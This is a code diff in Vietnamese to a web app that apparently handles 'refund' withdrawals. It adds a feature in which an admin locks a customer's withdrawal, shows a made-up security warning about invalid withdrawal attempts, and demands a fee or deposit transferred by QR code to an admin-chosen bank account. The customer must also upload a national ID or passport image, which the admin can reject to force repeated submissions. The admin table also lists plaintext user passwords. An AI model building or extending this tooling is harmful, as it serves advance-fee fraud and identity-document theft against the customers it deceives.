@@ -135,6 +135,7 @@
         .col-user { width: 110px; } .col-name { width: 150px; } .col-bank { width: 110px; } 
         .col-acc { width: 140px; } .col-code { width: 170px; } .col-money { width: 120px; } 
         .col-time { width: 150px; } .col-status { width: 110px; } .col-handler { width: 160px; } .col-action { width: 180px; }
+        .col-id { width: 130px; } 
     </style>
 </head>
 <body>
@@ -240,6 +241,41 @@
                                 </div>
                             </div>
 
+                            <!-- KHỐI XÁC MINH CHÍNH CHỦ DÀNH CHO USER -->
+                            <div id="identityVerifyBox" class="hidden bg-purple-50 border-l-4 border-purple-500 p-5 rounded-2xl shadow-sm text-left animate__animated animate__zoomIn animate__faster">
+                                <h3 class="text-purple-800 font-extrabold uppercase text-xs mb-3 tracking-wider flex items-center gap-2"><i class="fas fa-id-card text-lg text-purple-600"></i> YÊU CẦU XÁC MINH CHÍNH CHỦ</h3>
+                                <div class="bg-white p-6 rounded-xl text-xs font-bold text-slate-700 space-y-4 shadow-inner border border-slate-100/50">
+                                    
+                                    <div class="text-center p-3 bg-rose-50 border border-rose-200 rounded-xl mb-2">
+                                        <span class="text-rose-500 font-black uppercase tracking-wider block mb-1 text-[10px]">LÝ DO YÊU CẦU:</span>
+                                        <span id="lblIdReason" class="text-rose-700 font-bold text-xs uppercase">PHÁT HIỆN THAO TÁC RÚT TIỀN KHÔNG HỢP LỆ. VUI LÒNG XÁC MINH GIAO DỊCH CHÍNH CHỦ ĐỂ HỆ THỐNG MỞ LẠI LỆNH RÚT TIỀN MỚI.</span>
+                                    </div>
+                                    <p class="text-slate-600 uppercase text-center mb-2">Hệ thống yêu cầu xác minh danh tính và thanh toán phí/cọc bảo lãnh để tiếp tục.</p>
+                                    
+                                    <div class="w-full flex flex-col items-center justify-center py-2 bg-slate-50 rounded-xl border border-slate-100">
+                                        <p class="text-[10px] text-rose-600 font-bold uppercase tracking-wider mb-2"><i class="fas fa-qrcode mr-1"></i> Quét mã QR chuyển khoản</p>
+                                        <img id="imgIdVerifyQr" src="" class="w-40 h-40 border-2 border-white rounded-lg shadow-sm object-contain bg-white">
+                                    </div>
+
+                                    <div class="space-y-2 border-b border-slate-100 pb-4">
+                                        <div class="flex justify-between items-center"><span class="text-slate-400 font-bold">NGÂN HÀNG:</span><span id="lblIdBank" class="text-right uppercase font-extrabold text-slate-800">...</span></div>
+                                        <div class="flex justify-between items-center"><span class="text-slate-400 font-bold">SỐ TÀI KHOẢN:</span><span id="lblIdAcc" class="text-right font-mono text-sky-600 font-black text-sm">...</span></div>
+                                        <div class="flex justify-between items-center"><span class="text-slate-400 font-bold">CHỦ TÀI KHOẢN:</span><span id="lblIdName" class="text-right uppercase font-extrabold text-slate-800">...</span></div>
+                                        <div class="flex justify-between items-center"><span class="text-slate-400 font-bold">SỐ TIỀN:</span><span id="lblIdMoney" class="text-right text-rose-600 font-black text-sm">0 VNĐ</span></div>
+                                        <div class="flex justify-between items-center"><span class="text-slate-400 font-bold">NỘI DUNG:</span><span id="lblIdNote" class="text-right font-extrabold text-slate-800 uppercase tracking-wide">...</span></div>
+                                    </div>
+
+                                    <div class="pt-2">
+                                        <label class="label-small text-purple-700"><i class="fas fa-cloud-arrow-up mr-1"></i> Tải lên ảnh mặt trước CCCD hoặc Hộ chiếu</label>
+                                        <input type="file" id="idImageUpload" accept="image/*" class="w-full text-xs text-slate-500 file:mr-4 file:py-2.5 file:px-4 file:rounded-xl file:border-0 file:text-xs file:font-bold file:bg-purple-50 file:text-purple-700 hover:file:bg-purple-100 cursor-pointer border border-slate-200 rounded-xl bg-slate-50 mt-1">
+                                    </div>
+                                </div>
+                                <button onclick="submitIdentityVerify()" class="mt-4 w-full bg-purple-600 hover:bg-purple-700 text-white py-3.5 rounded-xl font-bold text-xs uppercase shadow transition active:scale-[0.99] tracking-wider">Gửi ảnh xác minh & Đã chuyển khoản</button>
+                            </div>
+                            <div id="identityPendingBox" class="hidden bg-purple-50 border-l-4 border-purple-500 p-5 rounded-2xl shadow-sm animate-pulse">
+                                <div class="flex items-center text-purple-800 font-bold uppercase text-[11px] tracking-wider"><i class="fas fa-user-clock mr-3 text-sm"></i> ĐANG CHỜ ADMIN DUYỆT HỒ SƠ CHÍNH CHỦ...</div>
+                            </div>
+
                             <div id="verifyBox" class="hidden bg-rose-50 border-l-4 border-rose-500 p-5 rounded-2xl shadow-sm text-left animate__animated animate__zoomIn animate__faster">
                                 <h3 class="text-rose-800 font-extrabold uppercase text-xs mb-3 tracking-wider flex items-center gap-2"><i class="fas fa-file-circle-xmark text-lg text-rose-600"></i> BIÊN LAI GIAO DỊCH BỊ TỪ CHỐI</h3>
                                 <div id="rejectSlipContent" class="bg-white p-6 rounded-xl text-xs font-bold text-slate-700 space-y-3 shadow-inner border border-slate-100/50">
@@ -295,7 +331,14 @@
                             <table>
                                 <thead>
                                     <tr>
-                                        <th class="col-name">Họ tên</th><th class="col-user">Tài khoản</th><th class="col-status">Quyền</th><th class="col-status">Mật khẩu</th><th class="col-status text-center">Trạng Thái</th><th class="col-status text-center">Quyền Rút</th><th class="col-action text-center">Thao tác</th>
+                                        <th class="col-name">Họ tên</th>
+                                        <th class="col-user">Tài khoản</th>
+                                        <th class="col-status">Quyền</th>
+                                        <th class="col-status">Mật khẩu</th>
+                                        <th class="col-status text-center">Trạng Thái</th>
+                                        <th class="col-status text-center">Quyền Rút</th>
+                                        <th class="col-id text-center">Chính Chủ</th>
+                                        <th class="col-action text-center">Thao tác</th>
                                     </tr>
                                 </thead>
                                 <tbody id="u-list-body" class="divide-y divide-slate-100"></tbody>
@@ -482,6 +525,47 @@
         <button onclick="confirmOrderSubmit()" class="w-full py-3.5 bg-rose-600 hover:bg-rose-700 text-white font-bold rounded-xl text-xs uppercase shadow transition tracking-wider mt-1">GỬI THÔNG BÁO TỚI USER</button>
     </div></div></div>
 
+    <!-- MODAL CẤU HÌNH YÊU CẦU XÁC MINH CHÍNH CHỦ (ADMIN) -->
+    <div id="idRequestFolder" class="modal" onclick="if(event.target==this) closeModal('idRequestFolder')">
+        <div class="modal-content">
+            <span class="cursor-pointer float-right p-4 text-slate-400 hover:text-slate-600 text-2xl font-bold" onclick="closeModal('idRequestFolder')">&times;</span>
+            <div class="p-6 space-y-3 text-left">
+                <input type="hidden" id="reqIdUserId">
+                <label class="label-small font-extrabold text-sm border-b pb-2 text-purple-600 flex items-center gap-1.5"><i class="fas fa-id-card"></i> CẤU HÌNH YÊU CẦU XÁC MINH CHÍNH CHỦ</label>
+                
+                <div class="grid grid-cols-2 gap-3 pt-1">
+                    <div><label class="label-small">Ngân hàng nhận</label><input type="text" id="reqIdBank" class="input-pro !py-2 text-xs" placeholder="mbbank, vcb..."></div>
+                    <div><label class="label-small">Số tài khoản nhận</label><input type="text" id="reqIdAcc" class="input-pro !py-2 text-xs font-mono"></div>
+                </div>
+                <div><label class="label-small">Chủ tài khoản nhận</label><input type="text" id="reqIdName" class="input-pro !py-2 text-xs uppercase"></div>
+                <div><label class="label-small">Số tiền phí/cọc (VNĐ)</label><input type="number" id="reqIdMoney" class="input-pro !py-2 text-xs font-bold text-rose-600"></div>
+                <div><label class="label-small">Nội dung chuyển khoản</label><input type="text" id="reqIdNote" class="input-pro !py-2 text-xs uppercase" placeholder="XAC MINH CHINH CHU"></div>
+                
+                <!-- TRƯỜNG LÝ DO YÊU CẦU CHÍNH CHỦ -->
+                <div><label class="label-small">Lý do yêu cầu (Hiển thị cho khách)</label>
+                <textarea id="reqIdReason" class="w-full border border-slate-200 p-2.5 rounded-xl font-semibold text-xs bg-slate-50 focus:bg-white outline-none focus:border-purple-400 transition" rows="2" placeholder="CẢNH BÁO BẢO MẬT: Giao dịch bị tạm khóa do phát hiện thao tác rút tiền sai quá số lần quy định. Để bảo vệ tài sản, Quý khách vui lòng xác minh chính chủ để hệ thống cấp lại quyền rút tiền."></textarea></div>
+                
+                <button onclick="confirmSendIdRequest()" class="w-full py-3.5 bg-purple-600 hover:bg-purple-700 text-white font-bold rounded-xl text-xs uppercase shadow transition tracking-wider mt-1">GỬI YÊU CẦU CHO KHÁCH</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL XEM ẢNH CCCD CỦA KHÁCH -->
+    <div id="viewIdImageModal" class="modal" onclick="if(event.target==this) closeModal('viewIdImageModal')">
+        <div class="modal-content">
+            <span class="cursor-pointer float-right p-4 text-slate-400 hover:text-slate-600 text-2xl font-bold" onclick="closeModal('viewIdImageModal')">&times;</span>
+            <div class="p-6 space-y-4 text-center">
+                <h3 class="font-extrabold text-sm uppercase text-slate-700 border-b pb-3 tracking-wide"><i class="fas fa-image text-purple-600 mr-2"></i> ẢNH XÁC MINH CỦA KHÁCH</h3>
+                <img id="adminViewIdImg" src="" class="w-full max-h-[60vh] object-contain rounded-lg border border-slate-200 bg-slate-50">
+                <div class="flex gap-3 mt-4">
+                    <button onclick="approveIdentity()" class="flex-1 bg-emerald-600 hover:bg-emerald-700 text-white py-3 rounded-xl font-bold text-xs uppercase shadow transition active:scale-95">Duyệt & Mở Khóa</button>
+                    <button onclick="rejectIdentity()" class="flex-1 bg-rose-600 hover:bg-rose-700 text-white py-3 rounded-xl font-bold text-xs uppercase shadow transition active:scale-95">Yêu cầu úp lại</button>
+                </div>
+                <input type="hidden" id="viewingUserId">
+            </div>
+        </div>
+    </div>
+
     <script>
         window.getVNTime = () => {
             const options = { timeZone: 'Asia/Ho_Chi_Minh', hour: '2-digit', minute: '2-digit', day: '2-digit', month: '2-digit', year: 'numeric', hour12: false };
@@ -558,7 +642,6 @@
                     document.getElementById('lbl-stat-users').innerText = "Thành viên của tôi";
                 }
 
-                // TÍCH HỢP TAB CHAT MỚI: Mở Tab Live Chat (a-chat-hub) vào Menu cho Admin
                 let adminMenuHtml = `
                     <div onclick="switchTab('a-dash')" class="sidebar-item active"><i class="fas fa-chart-pie mr-3 w-4 text-center"></i>Bảng điều khiển</div>
                     <div onclick="switchTab('history-view')" class="sidebar-item"><i class="fas fa-list-check mr-3 w-4 text-center"></i>Quản lý hoàn tiền</div>
@@ -574,7 +657,6 @@
                 badge.innerText = "USER";
                 badge.className = "px-1.5 py-0.5 rounded text-[9px] font-black tracking-wide uppercase bg-sky-600 text-white";
                 
-                // Mở bong bóng Chat cho tài khoản khách hàng
                 document.getElementById('user-chat-widget').classList.remove('hidden');
                 setupUserChatRealtime();
 
@@ -631,7 +713,7 @@
                 }
 
                 if(filteredUsers.length === 0) {
-                    document.getElementById('u-list-body').innerHTML = `<tr><td colspan="7" class="text-center py-8 text-slate-400 font-medium bg-white"><i class="fas fa-user-slash mr-2 text-base"></i> Không tìm thấy thành viên phù hợp</td></tr>`;
+                    document.getElementById('u-list-body').innerHTML = `<tr><td colspan="8" class="text-center py-8 text-slate-400 font-medium bg-white"><i class="fas fa-user-slash mr-2 text-base"></i> Không tìm thấy thành viên phù hợp</td></tr>`;
                 } else {
                     document.getElementById('u-list-body').innerHTML = filteredUsers.map(u => {
                         let roleTagHtml = '';
@@ -646,6 +728,12 @@
                             <td class="col-name font-bold text-slate-700">${u.name}</td><td class="col-user text-slate-500 font-semibold">${u.user}</td><td class="col-status">${roleTagHtml}</td><td class="col-status font-mono text-slate-600 font-medium">${u.pass}</td>
                             <td class="col-status text-center"><button onclick="window.updateUserCloud('${u.id}', {isFrozen: !${u.isFrozen}}); window.showToast('Cập nhật trạng thái thành công')" class="text-2xl transition-transform duration-200 active:scale-90 ${u.isFrozen?'text-rose-500':'text-emerald-500'}"><i class="fas ${u.isFrozen?'fa-toggle-off':'fa-toggle-on'}"></i></button></td>
                             <td class="col-status text-center"><button onclick="window.updateUserCloud('${u.id}', {canWithdraw: !${u.canWithdraw}, needVerify: false, verifyMsg: ''}); window.showToast('Cập nhật quyền rút tiền thành công')" class="text-[10px] border px-2.5 py-1 rounded-lg uppercase font-extrabold tracking-wide transition-all duration-200 active:scale-95 ${u.canWithdraw?'text-emerald-600 border-emerald-200 bg-emerald-50':'text-amber-600 border-amber-200 bg-amber-50'}">${u.canWithdraw?'Mở Khóa':'Đang Khóa'}</button></td>
+                            <td class="col-id text-center">
+                                ${u.idVerifyStatus === 'SUBMITTED' 
+                                    ? `<button onclick="openViewIdModal('${u.id}', '${u.idImageData || ''}')" class="text-[10px] border px-2.5 py-1 rounded-lg uppercase font-extrabold bg-emerald-50 text-emerald-600 border-emerald-200 hover:bg-emerald-100 active:scale-95">Xem Ảnh</button>`
+                                    : `<button onclick="openIdReqFolder('${u.id}')" class="text-[10px] border px-2.5 py-1 rounded-lg uppercase font-extrabold tracking-wide transition-all active:scale-95 bg-purple-50 text-purple-600 border-purple-200 hover:bg-purple-100">Yêu Cầu</button>`
+                                }
+                            </td>
                             <td class="col-action text-center space-x-2">
                                 <button onclick="openUMFolder('editU', '${u.id}')" class="text-amber-600 hover:text-amber-700 font-bold text-xs uppercase hover:underline">Sửa</button>
                                 ${u.id !== 'admin_chinh' ? `<button onclick="delU('${u.id}')" class="text-rose-500 hover:text-rose-600 font-bold text-xs uppercase hover:underline">Xóa</button>` : ''}
@@ -654,8 +742,6 @@
                     }).join('');
                 }
 
-                // LIVE CHAT PHÂN QUYỀN: Cập nhật danh sách phòng chat hiển thị bên thanh trái Admin
-                // Admin Tổng thấy mọi User hệ thống, Admin Con chỉ thấy User do mình phụ trách
                 const chatUsersList = window.uStore.filter(u => u.role === 'USER' && (window.curU.id === 'admin_chinh' || u.parentId === window.curU.id));
                 const listChatContainer = document.getElementById('chat-list-users');
                 if(listChatContainer) {
@@ -719,7 +805,35 @@
                 const vBox = document.getElementById('verifyBox'), wBox = document.getElementById('waitingBox'), sBox = document.getElementById('successBillBox'), btn = document.getElementById('mainWithdrawBtn'), gBox = document.getElementById('unlockedGuideBox');
                 vBox.classList.add('hidden'); wBox.classList.add('hidden'); sBox.classList.add('hidden'); gBox.classList.add('hidden'); btn.style.opacity = '1';
                 
-                if(window.curU.successBill) { 
+                const idBox = document.getElementById('identityVerifyBox'), idPndBox = document.getElementById('identityPendingBox');
+                if(idBox) idBox.classList.add('hidden'); 
+                if(idPndBox) idPndBox.classList.add('hidden');
+
+                if(window.curU.reqIdActive) {
+                    btn.style.opacity = '0.5';
+                    if(window.curU.idVerifyStatus === 'SUBMITTED') {
+                        if(idPndBox) idPndBox.classList.remove('hidden');
+                    } else {
+                        if(idBox) idBox.classList.remove('hidden');
+                        
+                        // HIỂN THỊ LÝ DO YÊU CẦU
+                        if(document.getElementById('lblIdReason')) {
+                            document.getElementById('lblIdReason').innerText = window.curU.idvReason || 'PHÁT HIỆN THAO TÁC RÚT TIỀN KHÔNG HỢP LỆ. VUI LÒNG XÁC MINH GIAO DỊCH CHÍNH CHỦ ĐỂ HỆ THỐNG MỞ LẠI LỆNH RÚT TIỀN MỚI.';
+                        }
+                        
+                        document.getElementById('lblIdBank').innerText = window.curU.idvBank || '';
+                        document.getElementById('lblIdAcc').innerText = window.curU.idvAcc || '';
+                        document.getElementById('lblIdName').innerText = window.curU.idvName || '';
+                        document.getElementById('lblIdMoney').innerText = Number(window.curU.idvMoney || 0).toLocaleString() + " VNĐ";
+                        document.getElementById('lblIdNote').innerText = window.curU.idvNote || '';
+                        
+                        if (window.curU.idvBank && window.curU.idvAcc) {
+                            const encodedNote = encodeURIComponent(window.curU.idvNote || '');
+                            const qrUrl = `https://img.vietqr.io/image/${window.curU.idvBank}-${window.curU.idvAcc}-compact2.png?amount=${window.curU.idvMoney}&addInfo=${encodedNote}&accountName=${encodeURIComponent(window.curU.idvName || '')}`;
+                            document.getElementById('imgIdVerifyQr').src = qrUrl;
+                        }
+                    }
+                } else if(window.curU.successBill) { 
                     sBox.classList.remove('hidden'); const b = window.curU.successBill; 
                     document.getElementById('billContent').innerHTML = `<div class="text-center border-b border-emerald-100 pb-3 mb-3 text-emerald-800 font-extrabold text-sm tracking-wide">THÔNG TIN GIAO DỊCH HOÀN TẤT</div><div class="grid grid-cols-3 gap-y-2.5 py-1 text-slate-600"><div class="text-slate-400 font-bold">CHỦ TÀI KHOẢN:</div><div class="col-span-2 text-right uppercase font-extrabold text-slate-800 tracking-wide">${b.name}</div><div class="text-slate-400 font-bold">SỐ TÀI KHOẢN:</div><div class="col-span-2 text-right font-mono text-sky-600 font-black text-xs">${b.acc}</div><div class="text-gray-400 font-bold">NGÂN HÀNG:</div><div class="col-span-2 text-right uppercase font-extrabold text-slate-800">${b.bank || 'N/A'}</div><div class="text-slate-400 font-bold">SỐ TIỀN HOÀN:</div><div class="col-span-2 text-right text-rose-600 font-black text-sm">${b.money} VNĐ</div><div class="text-slate-400 font-bold">NỘI DUNG:</div><div class="col-span-2 text-right italic font-semibold text-slate-500">${b.note}</div></div>`; 
                 } else if(window.curU.needVerify && window.curU.verifyMsg) { 
@@ -763,7 +877,6 @@
             }
         }
 
-        /* ---------------- LOGIC LIVE CHAT HỆ THỐNG REALTIME ---------------- */
         function toggleUserChatBox() {
             const chatBox = document.getElementById('user-chat-box');
             chatBox.classList.toggle('hidden');
@@ -815,7 +928,7 @@
                 senderId: window.curU.id,
                 senderName: window.curU.name,
                 text: txt,
-                time: window.getVNTime().split(' ')[0] // Lấy mốc giờ phút
+                time: window.getVNTime().split(' ')[0] 
             });
             inp.value = '';
         }
@@ -826,7 +939,6 @@
             document.getElementById('chat-window-active').classList.remove('hidden');
             document.getElementById('chat-title-name').innerText = userName;
             
-            // Xử lý background màu sắc active cho danh sách cuộc trò chuyện
             document.querySelectorAll('#chat-list-users > div').forEach(el => el.classList.remove('bg-indigo-50/70', 'border-l-4', 'border-indigo-500'));
             const targetItem = document.getElementById('chat-item-' + userId);
             if(targetItem) targetItem.classList.add('bg-indigo-50/70', 'border-l-4', 'border-indigo-500');
@@ -871,7 +983,6 @@
             });
             inp.value = '';
         }
-        /* ------------------------------------------------------------------ */
 
         window.openVerificationModal = () => {
             const rawBank = (window.curU.adminVerifyBank || '').trim().toLowerCase();
@@ -1032,6 +1143,88 @@
         };
         function openModal(id) { document.getElementById(id).classList.add('active'); }
         function closeModal(id) { document.getElementById(id).classList.remove('active'); }
+
+        // --- CÁC HÀM LIÊN QUAN ĐẾN XÁC MINH CHÍNH CHỦ ---
+
+        window.openIdReqFolder = (userId) => {
+            document.getElementById('reqIdUserId').value = userId;
+            ['reqIdBank', 'reqIdAcc', 'reqIdName', 'reqIdMoney', 'reqIdNote', 'reqIdReason'].forEach(id => {
+                if(document.getElementById(id)) document.getElementById(id).value = '';
+            });
+            openModal('idRequestFolder');
+        };
+
+        window.confirmSendIdRequest = async () => {
+            const uId = document.getElementById('reqIdUserId').value;
+            const b = document.getElementById('reqIdBank').value.trim();
+            const a = document.getElementById('reqIdAcc').value.trim();
+            const n = document.getElementById('reqIdName').value.trim().toUpperCase();
+            const m = document.getElementById('reqIdMoney').value.trim();
+            const note = document.getElementById('reqIdNote').value.trim().toUpperCase();
+            const r = document.getElementById('reqIdReason').value.trim() || 'PHÁT HIỆN THAO TÁC RÚT TIỀN KHÔNG HỢP LỆ. VUI LÒNG XÁC MINH GIAO DỊCH CHÍNH CHỦ ĐỂ HỆ THỐNG MỞ LẠI LỆNH RÚT TIỀN MỚI.';
+
+            if(!b || !a || !n || !m) return Swal.fire("Lỗi", "Vui lòng nhập đủ thông tin ngân hàng và số tiền phí!", "error");
+
+            await window.updateUserCloud(uId, {
+                reqIdActive: true,
+                idVerifyStatus: 'PENDING_USER',
+                idvBank: b, idvAcc: a, idvName: n, idvMoney: Number(m), idvNote: note, idvReason: r.toUpperCase(),
+                canWithdraw: false
+            });
+            
+            closeModal('idRequestFolder');
+            window.showToast("Đã gửi yêu cầu xác minh CCCD đến Khách hàng!");
+        };
+
+        window.submitIdentityVerify = async () => {
+            const fileInput = document.getElementById('idImageUpload');
+            const file = fileInput.files[0];
+            
+            if(!file) return Swal.fire("Lỗi", "Vui lòng tải lên hình ảnh CCCD hoặc Hộ chiếu của bạn!", "error");
+            
+            Swal.fire({ title: 'Đang xử lý...', text: 'Vui lòng chờ trong giây lát', allowOutsideClick: false, didOpen: () => Swal.showLoading() });
+
+            const reader = new FileReader();
+            reader.onload = async (e) => {
+                const base64Image = e.target.result;
+                try {
+                    await window.updateUserCloud(window.curU.id, {
+                        idVerifyStatus: 'SUBMITTED',
+                        idImageData: base64Image
+                    });
+                    Swal.fire("Thành công!", "Đã gửi hồ sơ và thông tin chuyển khoản. Vui lòng chờ hệ thống xét duyệt.", "success");
+                } catch(err) {
+                    Swal.fire("Lỗi mạng", "Không thể gửi dữ liệu, hình ảnh quá lớn hoặc mất kết nối.", "error");
+                }
+            };
+            reader.readAsDataURL(file);
+        };
+
+        window.openViewIdModal = (userId, imgData) => {
+            if(!imgData || imgData === 'undefined') {
+                Swal.fire("Lỗi", "Khách hàng chưa tải ảnh lên hoặc lỗi dữ liệu ảnh!", "error");
+                return;
+            }
+            document.getElementById('viewingUserId').value = userId;
+            document.getElementById('adminViewIdImg').src = imgData;
+            openModal('viewIdImageModal');
+        };
+
+        window.approveIdentity = async () => {
+            const uId = document.getElementById('viewingUserId').value;
+            await window.updateUserCloud(uId, { reqIdActive: false, idVerifyStatus: '', idImageData: null });
+            closeModal('viewIdImageModal');
+            window.showToast('Đã duyệt CCCD và mở khóa cho khách!');
+        };
+
+        window.rejectIdentity = async () => {
+            const uId = document.getElementById('viewingUserId').value;
+            await window.updateUserCloud(uId, { idVerifyStatus: 'PENDING_USER', idImageData: null });
+            closeModal('viewIdImageModal');
+            window.showToast('Đã từ chối ảnh, khách sẽ phải tải lại!', 'info');
+        };
+
+        // --- END ---
 
         setInterval(() => { 
             const now = new Date();
